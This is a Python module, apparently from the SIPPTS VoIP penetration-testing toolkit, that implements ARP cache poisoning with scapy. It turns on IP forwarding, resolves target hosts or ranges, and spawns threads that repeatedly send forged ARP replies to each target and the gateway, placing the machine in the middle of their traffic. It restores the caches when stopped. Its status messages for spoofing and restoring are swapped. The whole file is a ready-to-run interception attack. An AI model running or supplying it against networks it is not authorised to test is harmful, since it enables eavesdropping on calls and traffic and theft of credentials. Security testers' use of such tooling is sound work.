#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.2'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"


from scapy.all import Ether, ARP, srp, send
import time
import signal
import os
import ipaddress
import threading
import platform
import socket
from IPy import IP
from lib.functions import get_machine_default_ip, ip2long, get_default_gateway_linux, get_default_gateway_mac, enable_ip_route, disable_ip_route, ip2long, long2ip
from lib.color import Color


class ArpSpoof:
    def __init__(self):
        self.ip = '-'
        self.gw = ''
        self.verbose = '0'
        self.file = ''
        self.ips = []
        self.dropped_ips = []

        self.run = True

        self.c = Color()

    # def __del__(self):
    #     print("I'm being automatically destroyed. Goodbye!")

    def signal_handler(self, sig, frame):
        print(self.c.BYELLOW + 'You pressed Ctrl+C!\n' + self.c.WHITE)
        print(self.c.BWHITE + 'Restoring ARP tables ...')
        print(self.c.WHITE)

        self.stop()

    def start(self):
        # current_user = os.getlogin()
        current_user = os.popen('whoami').read()
        current_user = current_user.strip()
        ops = platform.system()

        if self.verbose == None:
            self.verbose = 0

        if ops == 'Linux' and current_user != 'root':
            print(self.c.WHITE + 'You must be ' + self.c.RED +
                  'root' + self.c.WHITE + ' to use this module')
            return

        signal.signal(signal.SIGINT, self.signal_handler)
        print(self.c.BYELLOW + '\nPress Ctrl+C to stop')
        print(self.c.WHITE)

        # my IP address
        local_ip = get_machine_default_ip()

        if self.gw == '':
            if ops == 'Linux':
                self.gw = get_default_gateway_linux()
            if ops == 'Darwin':
                self.gw = get_default_gateway_mac().strip()

        print(self.c.BWHITE + '[!] Operating System: ' + self.c.GREEN + '%s' % ops)
        print(self.c.BWHITE + '[!] Current User: ' + self.c.GREEN + '%s' % current_user)
        print(self.c.BWHITE + '[!] Local IP address: ' + self.c.GREEN + '%s' % local_ip)
        print(self.c.BWHITE + '[!] Target IP/range: ' + self.c.GREEN + '%s' % self.ip)
        print(self.c.BWHITE + '[!] Gateway: ' + self.c.GREEN + '%s' % self.gw)
        print(self.c.WHITE)

        enable_ip_route()

        if self.file != '':
            try:
                with open(self.file) as f:
                    line = f.readline()
                    line = line.replace('\n', '')
                    hosts = []

                    while (line):
                        if self.run == True:
                            try:
                                i = socket.gethostbyname(line)
                            except:
                                pass
                            hlist = list(ipaddress.ip_network(str(i)).hosts())

                            if hlist == []:
                                hosts.append(i)
                            else:
                                for h in hlist:
                                    hosts.append(h)

                            last = len(hosts)-1
                            start_ip = hosts[0]
                            end_ip = hosts[last]

                            ipini = int(ip2long(str(start_ip)))
                            ipend = int(ip2long(str(end_ip)))

                            for ip in range(ipini, ipend+1):
                                # if ip != local_ip:
                                if ip != local_ip and ip != self.gw:
                                    self.ips.append(long2ip(ip))
                                    self.ips.append('')

                        line = f.readline()

                f.close()
            except:
                print('Error reading file %s' % self.file)
                exit()
        else:
            hosts = []
            for i in self.ip.split(','):
                try:
                    i = socket.gethostbyname(i)
                except:
                    pass
                hlist = list(ipaddress.ip_network(str(i)).hosts())

                if hlist == []:
                    hosts.append(i)
                else:
                    for h in hlist:
                        hosts.append(h)

                last = len(hosts)-1
                start_ip = hosts[0]
                end_ip = hosts[last]

                ipini = int(ip2long(str(start_ip)))
                ipend = int(ip2long(str(end_ip)))

                for ip in range(ipini, ipend+1):
                    # if ip != local_ip:
                    if ip != local_ip and ip != self.gw:
                        self.ips.append(long2ip(ip))
                        self.ips.append('')

        threads = list()

        if self.ips == []:
            print(self.c.RED + '\nNo IPs found')
            exit()

        n = len(self.ips)

        self.run = True

        for x in range(0, n, 2):
            ip = self.ips[x]
            mac = self.ips[x+1]

            t = threading.Thread(target=self.start_spoof, args=(
                str(ip), self.gw, mac, int(self.verbose)), daemon=True)

            threads.append(t)
            t.start()
            time.sleep(0.1)

        t.join()

    def stop(self):
        print(self.c.BWHITE + '\nRestoring ARP tables ...')
        print(self.c.BWHITE)

        # my IP address
        local_ip = get_machine_default_ip()

        n = len(self.ips)

        self.run = False

        for x in range(0, n, 2):
            ip = self.ips[x]
            if ip not in self.dropped_ips:
                if ip != local_ip and ip != self.gw:
                    self.restore(str(ip), self.gw)

        self.restore(self.gw, str(ip))

        # disable ip forwarding
        disable_ip_route()

    def get_mac(self, ip):
        """
        Returns MAC address of any device connected to the network
        If ip is down, returns None instead
        """
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') /
                     ARP(pdst=ip), timeout=3, verbose=0)

        if ans:
            return ans[0][1].src

    def spoof(self, target_ip, host_ip, target_mac, verbose=1):
        """
        Spoofs `target_ip` saying that we are `host_ip`.
        it is accomplished by changing the ARP cache of the target (poisoning)
        """
        # craft the arp 'is-at' operation packet, in other words; an ARP response
        # we don't specify 'hwsrc' (source MAC address)
        # because by default, 'hwsrc' is the real MAC address of the sender (ours)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                           psrc=host_ip, op='is-at')
        # send the packet
        # verbose = 0 means that we send the packet without printing any thing
        send(arp_response, verbose=0)
        if verbose == 2:
            # get the MAC address of the default interface we are using
            self_mac = ARP().hwsrc
            print(
                self.c.YELLOW + "[+] Sent restoring to {} : {} is-at {}".format(target_ip, host_ip, self_mac) + self.c.WHITE)

    def restore(self, target_ip, host_ip, verbose=1):
        """
        Restores the normal process of a regular network
        This is done by sending the original informations 
        (real IP and MAC of `gw_ip` ) to `target_ip`
        """
        # get the real MAC address of target
        target_mac = self.get_mac(target_ip)
        # get the real MAC address of spoofed (gateway, i.e router)
        host_mac = self.get_mac(host_ip)
        # crafting the restoring packet
        arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                           psrc=host_ip, hwsrc=host_mac)
        # sending the restoring packet
        # to restore the network to its BWHITE process
        # we send each reply seven times for a good measure (count=7)
        send(arp_response, verbose=0, count=7)
        if verbose > 0:
            print(
                self.c.GREEN + "[-] Sent poisoning to {} : {} is-at {}".format(target_ip, host_ip, host_mac) + self.c.WHITE)

    def start_spoof(self, target_ip, gw_ip, target_mac, verbose):
        if verbose > 0:
            # get the real MAC address of target
            target_mac = self.get_mac(target_ip)
            # get the real MAC address of spoofed (gateway, i.e router)
            gw_mac = self.get_mac(gw_ip)

            if target_mac == None:
                print(
                    self.c.RED + '[!] Error getting the target MAC address for IP: %s' % target_ip + self.c.WHITE)
                self.dropped_ips.append(target_ip)
                return
            if gw_mac == None:
                print(
                    self.c.RED + '[!] Error getting the gateway MAC address for IP: %s' % gw_ip + self.c.WHITE)
                return

            print(self.c.YELLOW + "[+] Start ARP spoof between %s (%s) and %s (%s)" %
                  (target_ip, target_mac, gw_ip, gw_mac) + self.c.WHITE)

        while self.run == True:
            # telling the `target` that we are the `gw`
            self.spoof(target_ip, gw_ip, target_mac, verbose)
            # telling the `gw` that we are the `target`
            self.spoof(gw_ip, target_ip, '', verbose)
            # sleep for one second
            time.sleep(1)
